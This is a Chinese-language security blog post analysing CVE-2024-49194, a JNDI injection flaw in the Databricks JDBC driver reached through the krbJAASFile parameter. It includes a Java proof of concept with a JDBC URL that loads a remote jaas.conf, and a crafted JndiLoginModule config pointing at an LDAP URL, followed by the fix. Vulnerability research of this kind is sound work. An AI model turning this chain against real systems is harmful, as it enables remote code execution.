---
title: CVE-2024-49194 Databricks JDBC 驱动 JNDI 注入漏洞分析
url: https://mp.weixin.qq.com/s?__biz=Mzk0NTU5Mjg0Ng==&mid=2247491560&idx=1&sn=38207e5d3b964e6a72dc91d14270d4fe&chksm=c3125089f465d99fffe85999e70840ee74fbd39c746d4e0535aabf91042cea36fdd25c061eea&scene=58&subscene=0#rd
source: 自在安全
date: 2025-02-18
fetch_date: 2025-10-06T20:47:13.870183
---

# CVE-2024-49194 Databricks JDBC 驱动 JNDI 注入漏洞分析

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/9UsWg6ibZLAzicSKBbeHhib0mmOrc37jxN8nEHOgOxnBETzLqfQyyRzhnmZGHEUQQBrFEmsYfAuFwdlLTlCEljxLw/0?wx_fmt=jpeg)

# CVE-2024-49194 Databricks JDBC 驱动 JNDI 注入漏洞分析

原创

KCyber

自在安全

**概述**

Databricks JDBC 驱动程序中存在一个漏洞，影响 v2.6.38 及以下版本。从官方通报的信息来看，漏洞根源与 krbJAASFile 参数有关，攻击者可使用具有 Property 的特殊 JDBC URL 来触发 JNDI 注入。

**漏洞分析**

引入环境：

```
<!-- https://mvnrepository.com/artifact/com.databricks/databricks-jdbc --><dependency>    <groupId>com.databricks</groupId>    <artifactId>databricks-jdbc</artifactId>    <version>2.6.38</version></dependency>
```

漏洞与参数 krbJAASFile 有关，直接提问大模型可知， krbJAASFile 参数用于 Kerberos 认证，负责指定 JAAS 配置文件路径：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/9UsWg6ibZLAzicSKBbeHhib0mmOrc37jxN8xD4vXGPlOSR1GYBlDPB1UnVzic7icREicNNgzQYsFoGuWTpcOhadxsaXQ/640?wx_fmt=png&from=appmsg)

krbJAASFile 如果仅仅加载本地配置文件没有意义，测试是否支持 http 远程加载：

```
package org.example;    import java.sql.DriverManager;    public class Main {      public static void main(String[] args) throws Exception {          String jdbcUrl = "jdbc:databricks://localhost:443/default;transportMode=http;\n" +                  "ssl=1;httpPath=/sql/1.0/endpoints/12345;\n" +                  "AuthMech=1;krbHostFQDN=localhost;\n" +                  "krbServiceName=spark;krbJAASFile=http://127.0.0.1:8888/jaas.conf";          DriverManager.getConnection(jdbcUrl);      }  }
```

确实可以从指定的 http 地址去加载远程文件，但是在 LoginContext 中抛出了异常：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/9UsWg6ibZLAzicSKBbeHhib0mmOrc37jxN8XDqrtkAEWv1ibAt3ia7Yjnnl0dESfsBsrDicVxQIolRbMazmnrHAicBR0w/640?wx_fmt=png&from=appmsg)

继续与大模型"对话"，修正 jaas.conf 配置：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/9UsWg6ibZLAzicSKBbeHhib0mmOrc37jxN8EA3cnP2x4NUtW2HoW5YaRlqOQYGibBq8HnrVyZ0eibTkjCIwI0eBLnlA/640?wx_fmt=png&from=appmsg)

更新配置后再次请求将进入 LoginContext#login 函数，并通过 invokePriv 来反射调用 LOGIN\_METHOD 函数：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/9UsWg6ibZLAzicSKBbeHhib0mmOrc37jxN80Oc0cegyOLibLU9HGiaVO4iaVtE7TluKkyalDLrIj6ovfpB4TcUoxqzOw/640?wx_fmt=png&from=appmsg)

继续往下走进入 Invoke 函数，这里将调用 module 对象的 login 函数， module 对应 jaas.conf 配置文件中的 Krb5LoginModule 类型：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/9UsWg6ibZLAzicSKBbeHhib0mmOrc37jxN8CwGns7DR80G7lhTHjNCoibS9Hv9SOhOmeeHw6mLJWurrLRflEXbpibEg/640?wx_fmt=png&from=appmsg)

分析发现 LoginModule 接口存在多个子类，除了 Krb5LoginModule ，还存在一个名为 JndiLoginModule 的类型，为了验证其是否存在 JNDI 注入漏洞，修改配置文件如下：

```
Client {   com.sun.security.auth.module.JndiLoginModule required   useKeyTab=true   keyTab="/etc/security/databricks.keytab"   principal="user@EXAMPLE.COM"   storeKey=true   debug=true;};
```

再次请求成功进入 com.sun.security.auth.module.JndiLoginModule#login 函数，内部首先判断 userProvider 、 groupProvider 是否为空，为空将抛出异常，然后当 tryFirstPass 为 true 时将调用 attemptAuthentication 函数：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/9UsWg6ibZLAzicSKBbeHhib0mmOrc37jxN8Pib3gTib8lk2TAwYWWJr0S505uxqFtdhoGbcyxT1ceF8IKPicKb9Gw8Tw/640?wx_fmt=png&from=appmsg)

进入 attemptAuthentication 函数，存在明显的 JNDI 注入漏洞的 Sink 点，并且 lookup 函数的输入参数 userProvider 可控 ：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/9UsWg6ibZLAzicSKBbeHhib0mmOrc37jxN8jUhcWpA0Ee08QKl8wRL8SmJcPo1ZtAMATyMjtYiceWV9SA3VardyHKA/640?wx_fmt=png&from=appmsg)

com.sun.security.auth.module.JndiLoginModule#initialize 函数中会完成 userProvider 等参数初始化：

```
public final String USER_PROVIDER = "user.provider.url";public final String GROUP_PROVIDER = "group.provider.url";...public void initialize(Subject subject, CallbackHandler callbackHandler,                           Map<String,?> sharedState,                           Map<String,?> options) {
  ...  userProvider = (String)options.get(USER_PROVIDER);  groupProvider = (String)options.get(GROUP_PROVIDER);  tryFirstPass =      "true".equalsIgnoreCase((String)options.get("tryFirstPass"));  ...}
```

因此很容易构造出触发 JNDI 注入漏洞的配置文件：

```
Client {   com.sun.security.auth.module.JndiLoginModule required   user.provider.url="ldap://localhost:1389/test"   group.provider.url="test"   tryFirstPass="true";};
```

成功触发：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/9UsWg6ibZLAzicSKBbeHhib0mmOrc37jxN8QZYIVf4bibVyMJWHYNnp2aiclRFwb5gA6ID146ktylndPAgzxichkvVeQ/640?wx_fmt=png&from=appmsg)

**修复方式**

新版本删除了对 krbJAASFile 参数的支持：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/9UsWg6ibZLAzicSKBbeHhib0mmOrc37jxN82UfTLKRvoPme8IqlVwBBL91sU3Q6JHzePRLjsmNhN1dyLfJfibFKMRw/640?wx_fmt=png&from=appmsg)

**由于传播、利用此文档提供的信息而造成任何直接或间接的后果及损害，均由使用本人负责，公众号及文章作者不为此承担任何责任。**

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/sz_mmbiz_png/9UsWg6ibZLAyXOOjT6ic7nYAv7IbBiaSry4atmFYFQotupk7xIuiaK0opNtiariaXJo31Cf1X4t5609epW2oBesIdoxA/0?wx_fmt=png)

自在安全

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/sz_mmbiz_png/9UsWg6ibZLAyXOOjT6ic7nYAv7IbBiaSry4atmFYFQotupk7xIuiaK0opNtiariaXJo31Cf1X4t5609epW2oBesIdoxA/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过